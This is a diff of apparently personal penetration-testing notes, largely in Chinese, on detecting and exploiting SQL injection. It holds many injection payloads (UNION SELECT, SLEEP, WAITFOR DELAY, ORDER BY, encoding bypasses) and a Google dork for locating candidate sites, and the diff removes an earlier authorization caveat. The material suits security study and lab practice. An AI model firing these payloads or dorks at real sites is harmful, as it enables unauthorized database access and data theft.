@@ -1,34 +1,77 @@
-注入 SQL 语句, 访问数据库.
+SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.
 
-若测试未授权的 Web  列出所有数据库即可, 得到授权后再深入测试.
+## 1. Entry point
 
-SQL 注入可能存在于认可向数据库发起查询的功能中
+只要与数据库进行交互就可能存在 SQLi
 
 ```
-登录框
-校验用户是否已注册
-检索
-页面详情
-Cookie
-需要调用后端功能的 API
+GET: /test?id=payload
+POST: username=payload
+Cookie: uid=payload
 ```
+
+## 2. Detection
+
+检测是否存在 SQLi
+
+这里推荐使用 [SQLi Query Tampering](https://portswigger.net/bappstore/86549d1076bd485aa84c2c2685bd9ffd) 生成 Payload
+
+### 2.1. Error
+
+传入特殊字符触发报错, 添加注释符 `-- ` , `--+` , `#` 后正常
+
+```
+'
+"
+;
+)
+*
+```
+
+常见的 Bypass 有 URL 编码和双重 URL 编码
+
+> 其中 `U+02BA` 和 `U+02B9` 在编码后传入可能被误判为 `U+0022` 和 `U+0027` 从而实现注入
+
+### 2.2. Bool
+
+使用恒等条件判断, 若为 `true` 则返回数据, 若为 `false` 则没有数据
+
+```
+/test?id=1 or 1=1  # true
+/test?id=1' or 1=1 # true
+/test?id=1" or 1=1 # true
+/test?id=1 and 1=2 # false
+```
+
+> 有时需要末尾添加注释符 `-- ` , `--+` , `#` 才能执行
+
+可通过 Merging characters 来 Bypass
+
+```
+`+HERP
+'||'HERP
+'+'HERP
+' 'HERP
+'%20'HERP
+'%2B'HERP
+```
+
+### 2.3. Time
+
+==------==
+
+## 3. PoC
 
 验证 sql 注入的方法
 
 ```
-id=1' 
-id=1"
-> 看是否报错
+非法数学运算
 id=1/1
 id=1/0
 > 看是否有不同（数据包，响应时间）
 ```
 
 ```
-id=1' and '1' ='1
-id=1' and 1=1#
-id=1' and 1=1-- 
-id=1' and 1=1--+
 id=1' waitfor delay '0:0:5'--+
 id=1' union select 1,@@VERSION,3--+
 
@@ -57,74 +100,24 @@ SELECT * FROM users WHERE username = 'administrator'--+' AND password = ''
 
 ## 1 MySQL 的 SQL 注入
 
-> 在 sql 语句中 1 位数字，'1' 为字符，（但是1=’1‘），'a' 必须有单引号
-
-当在前端输入用户名和密码时，系统可能会执行以下命令查询数据库中匹配的用户名和密码
-
-```sql
-select * from users where username='用户名' and password='密码'
-```
-
-在没有过滤的表单中可以在用户名提交以下字符
-
-```
-admin' or 1=1 --空格
-```
-
-> `--空格` 代表注释，有时需要使用 `#` 注释
-
-得到
-
-```sql
-select * from users where username='admin' or 1=1 -- ' and password='密码'
-```
-
-> 若想防止这种 SQL 注入，将用户名和密码分开匹配即可
-
-1. **单引号测试（'）：**
-
-   ```
-   ?id=1'
-   ```
-
-2. **双引号测试（"）：**
-
-   ```
-   ?id=1"
-   ```
-
-3. **错误消息分析：**
-
-   ```
-   ?id=1' AND 1=1-- 
-   ?id=1' AND 1=2--
-   ```
-
-4. **布尔测试：**
+1. **布尔测试：**
 
    ```
    ?id=1' AND SLEEP(5)--
    ?id=1' AND 1=2 UNION SELECT 1,2,3--
    ```
 
-5. **时间延迟测试：**
+2. **时间延迟测试：**
 
    ```
    ?id=1' AND SLEEP(5)--
    ?id=1' WAITFOR DELAY '0:0:5'--
    ```
 
-6. **报错注入：**
+3. **报错注入：**
 
    ```
    ?id=1' UNION SELECT 1,@@VERSION,3--
-   ```
-
-7. **逻辑测试：**
-
-   ```
-   ?id=1' OR '1'='1
-   ?id=1' AND '1'='2
    ```
 
 ## 2 分类
@@ -155,100 +148,38 @@ json型
 }
 ```
 
-## 3 注入方式
-
-布尔注入：
-
-根据返回页面的真假判断
-
-联合查询：
-
-使用 union 注入
-
-延时注入：
-
-根据页面的响应时间判断
-
-报错注入：
-
-把注入的语句返回到页面中
-
 ## 4 查找
 
 谷歌语法：`inurl:"php?id=" site:".com.cn"`
 
-注入
-
 ## 5 判断是否存在 SQL 注入
 
-1. **单引号测试（'）：**
-
-   ```
-   ?id=1'
-   ```
-
-2. **双引号测试（"）：**
-
-   ```
-   ?id=1"
-   ```
-
-3. **错误消息分析：**
-
-   ```
-   ?id=1' AND 1=1-- 
-   ?id=1' AND 1=2-- 
-   ```
-
-4. **布尔测试：**
+1. **布尔测试：**
 
    ```
    ?id=1' AND SLEEP(5)-- 
    ?id=1' AND 1=2 UNION SELECT 1,2,3-- 
    ```
 
-5. **时间延迟测试：**
+2. **时间延迟测试：**
 
    ```
    ?id=1' AND SLEEP(5)-- 
    ?id=1' WAITFOR DELAY '0:0:5'-- 
    ```
 
-6. **报错注入：**
+3. **报错注入：**
 
    ```
    ?id=1' UNION SELECT 1,@@VERSION,3-- 
    ```
 
-7. **逻辑测试：**
-
-   ```
-   ?id=1' OR '1'='1
-   ?id=1' AND '1'='2
-   ```
-
-8. **顺序注入**
+4. **顺序注入**
 
    ```
    ?id=1 order by 1
    ?id=1 order by 100
    ```
-
-### 5.1 数字型
-
-尝试传递逻辑错误
-
-```
-http://pu2lh35s.ia.aqlab.cn/?id=1 and 1=0
-```
-
-> 报错则说明存在 sql 注入
-
-修改逻辑使之正常访问
-
-```
-http://pu2lh35s.ia.aqlab.cn/?id=1 and 1=1
-```
 
 ### 5.2 字符型
 
@@ -612,3 +543,10 @@ http://192.168.1.76/sqli-labs/Less-8/?id=1' and if(ascii(substr(database(),1,1))
 ### 10.4 爆字段
 
 ### 10.5 拖库
+
+---
+
+Refrences
+
+- [SQL injection](https://portswigger.net/web-security/sql-injection)
+- [SQL Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/)
